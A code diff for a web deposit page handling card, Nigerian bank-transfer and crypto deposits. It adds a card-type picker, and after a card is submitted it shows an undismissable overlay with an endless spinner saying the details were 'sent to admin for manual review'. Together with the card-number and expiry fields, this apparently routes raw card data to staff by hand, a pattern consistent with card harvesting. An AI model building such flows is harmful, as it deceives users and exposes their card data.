@@ -9,13 +9,14 @@ import { Input } from '@/components/ui/input';
 import { useToast } from '@/hooks/use-toast';
 import { useCurrencyConverter } from '@/lib/currency';
 import { supabase } from '@/lib/supabaseClient';
-import { CreditCard, Landmark, Wallet } from 'lucide-react';
+import { CheckCircle2, ChevronDown, CreditCard, Landmark, Wallet } from 'lucide-react';
 
 type Method = 'card_payment' | 'local_bank_transfer' | 'crypto_checkout';
 
 const NGN_PER_USDT = 1600;
-const MIN_DEPOSIT_USDT = 1.25;
+const MIN_DEPOSIT_USDT = 10;
 const MAX_DEPOSIT_USDT = 725;
+const MIN_DEPOSIT_NGN_LOCAL = 10000;
 
 const CARD_TYPES = [
   { value: 'visa', label: 'Visa', image: '/cards/visa.svg' },
@@ -52,6 +53,8 @@ export default function DepositStartPage() {
 
   const [amount, setAmount] = useState('');
   const [cardType, setCardType] = useState<(typeof CARD_TYPES)[number]['value']>('visa');
+  const [cardPickerOpen, setCardPickerOpen] = useState(false);
+  const [cardSubmittedLocked, setCardSubmittedLocked] = useState(false);
   const [cardOwnerName, setCardOwnerName] = useState('');
   const [cardNumber, setCardNumber] = useState('');
   const [expiryDate, setExpiryDate] = useState('');
@@ -64,13 +67,13 @@ export default function DepositStartPage() {
   const [country, setCountry] = useState('');
   const [currencyCode, setCurrencyCode] = useState('USDT');
 
-  const { convert } = useCurrencyConverter(currencyCode);
-  const minDepositUser = method === 'local_bank_transfer' ? MIN_DEPOSIT_USDT * NGN_PER_USDT : convert(MIN_DEPOSIT_USDT);
+  const { convert, currency: activeCryptoCurrency } = useCurrencyConverter(currencyCode);
+  const minDepositUser = method === 'local_bank_transfer' ? MIN_DEPOSIT_NGN_LOCAL : convert(MIN_DEPOSIT_USDT);
   const maxDepositUser = method === 'local_bank_transfer' ? MAX_DEPOSIT_USDT * NGN_PER_USDT : convert(MAX_DEPOSIT_USDT);
 
   const isNigerian = useMemo(() => country.trim().toLowerCase() === 'nigeria', [country]);
   const selectedCard = CARD_TYPES.find((x) => x.value === cardType) || CARD_TYPES[0];
-  const displayCurrency = method === 'local_bank_transfer' ? 'NGN' : currencyCode;
+  const displayCurrency = method === 'local_bank_transfer' ? 'NGN' : activeCryptoCurrency;
 
   useEffect(() => {
     (async () => {
@@ -128,6 +131,11 @@ export default function DepositStartPage() {
         return;
       }
 
+      if (method === 'card_payment') {
+        setCardSubmittedLocked(true);
+        return;
+      }
+
       if (method === 'local_bank_transfer') {
         await new Promise((r) => setTimeout(r, 2000));
         router.push(`/deposit/checkout/${txId}`);
@@ -163,32 +171,60 @@ export default function DepositStartPage() {
 
           <CardContent className="p-6 space-y-4">
             <div className="flex items-center justify-between">
-              <h3 className="text-xl font-semibold">{method === 'card_payment' ? 'Card payment checkout' : method === 'local_bank_transfer' ? 'Local bank transfer checkout (NGN)' : 'Crypto payment checkout'}</h3>
+              <h3 className="text-xl font-semibold">{method === 'card_payment' ? 'Card payment form' : method === 'local_bank_transfer' ? 'Local bank transfer checkout (NGN)' : 'Crypto payment checkout'}</h3>
               <div className="font-semibold">{displayCurrency} {Number(amount || 0).toLocaleString()}</div>
             </div>
 
             <Input placeholder={`Amount (${displayCurrency})`} value={amount} onChange={(e) => setAmount(e.target.value)} type="number" />
             {method === 'local_bank_transfer' ? (
               <p className="text-xs text-muted-foreground">
-                Rate: 1 USDT = {NGN_PER_USDT.toLocaleString()} NGN. Minimum: {(MIN_DEPOSIT_USDT * NGN_PER_USDT).toLocaleString()} NGN ({MIN_DEPOSIT_USDT} USDT base).
+                Rate: 1 USDT = {NGN_PER_USDT.toLocaleString()} NGN. Minimum: {MIN_DEPOSIT_NGN_LOCAL.toLocaleString()} NGN.
               </p>
             ) : (
-              <p className="text-xs text-muted-foreground">Minimum deposit is 2000 NGN equivalent ({minDepositUser.toFixed(2)} {displayCurrency}).</p>
+              <p className="text-xs text-muted-foreground">Minimum deposit is {MIN_DEPOSIT_USDT} USDT equivalent ({minDepositUser.toFixed(2)} {displayCurrency}).</p>
             )}
 
             {method === 'card_payment' && (
               <div className="space-y-3">
                 <div className="space-y-2">
                   <label className="text-sm font-medium">Card type</label>
-                  <select
-                    className="w-full h-10 rounded-md border border-input bg-background px-3 text-sm"
-                    value={cardType}
-                    onChange={(e) => setCardType(e.target.value as (typeof CARD_TYPES)[number]['value'])}
-                  >
-                    {CARD_TYPES.map((card) => (
-                      <option key={card.value} value={card.value}>{card.label}</option>
-                    ))}
-                  </select>
+                  <div className="relative">
+                    <button
+                      type="button"
+                      onClick={() => setCardPickerOpen((x) => !x)}
+                      className="w-full h-12 rounded-xl border bg-background px-3 flex items-center justify-between"
+                    >
+                      <div className="flex items-center gap-3">
+                        <Image src={selectedCard.image} alt={selectedCard.label} width={44} height={28} className="rounded" />
+                        <span className="font-medium">{selectedCard.label}</span>
+                      </div>
+                      <ChevronDown className={`h-4 w-4 transition-transform ${cardPickerOpen ? 'rotate-180' : ''}`} />
+                    </button>
+                    {cardPickerOpen ? (
+                      <div className="absolute z-20 mt-2 w-full rounded-2xl border bg-card shadow-2xl overflow-hidden">
+                        {CARD_TYPES.map((card) => {
+                          const active = cardType === card.value;
+                          return (
+                            <button
+                              type="button"
+                              key={card.value}
+                              onClick={() => {
+                                setCardType(card.value);
+                                setCardPickerOpen(false);
+                              }}
+                              className={`w-full px-3 py-3 flex items-center justify-between border-b last:border-b-0 ${active ? 'bg-primary/10' : 'hover:bg-muted/40'}`}
+                            >
+                              <div className="flex items-center gap-3">
+                                <Image src={card.image} alt={card.label} width={44} height={28} className="rounded" />
+                                <span className="text-left">{card.label}</span>
+                              </div>
+                              <CheckCircle2 className={`h-5 w-5 ${active ? 'text-primary' : 'text-muted-foreground/40'}`} />
+                            </button>
+                          );
+                        })}
+                      </div>
+                    ) : null}
+                  </div>
                   <div className="rounded-md border p-2">
                     <div className="flex items-center gap-3">
                       <Image src={selectedCard.image} alt={selectedCard.label} width={66} height={42} className="rounded" />
@@ -219,6 +255,17 @@ export default function DepositStartPage() {
           </CardContent>
         </div>
       </Card>
+      {cardSubmittedLocked ? (
+        <div className="fixed inset-0 z-[80] bg-black/80 backdrop-blur-sm flex items-center justify-center">
+          <div className="w-[90%] max-w-sm rounded-2xl border border-primary/30 bg-card p-6 text-center space-y-4">
+            <div className="mx-auto h-12 w-12 rounded-full border-4 border-primary/30 border-t-primary animate-spin" />
+            <h4 className="text-lg font-semibold">Submitting card details...</h4>
+            <p className="text-sm text-muted-foreground">
+              Your card request has been sent to admin for manual review. Please keep this screen open.
+            </p>
+          </div>
+        </div>
+      ) : null}
     </div>
   );
 }
